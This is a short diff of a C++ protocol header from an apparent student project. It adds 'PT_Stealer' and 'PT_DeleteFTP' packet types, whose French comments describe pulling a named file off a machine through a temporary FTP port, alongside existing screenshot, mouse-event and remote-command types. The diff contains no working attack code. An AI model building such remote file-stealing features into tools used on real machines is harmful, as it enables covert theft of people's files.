@@ -5,7 +5,7 @@
 // Login   <galibe_s@epitech.net>
 //
 // Started on  Tue Oct 18 19:17:41 2016 stephane galibert
-// Last update Sat Nov  5 16:20:23 2016 stephane galibert
+// Last update Tue Nov  8 17:46:25 2016 stephane galibert
 //
 
 #pragma once
@@ -34,7 +34,9 @@ enum class PacketType : uint16_t
   PT_MouseEvent = 4,
   PT_Kill = 5,
   PT_Screenshot = 6,
-  PT_Command = 7
+  PT_Stealer = 7, // param: nom du fichier => return le port
+  PT_DeleteFTP = 8, // param: port (servira à delete le ftp associé) => return rien
+  PT_Command = 9
 };
 
 struct Packet
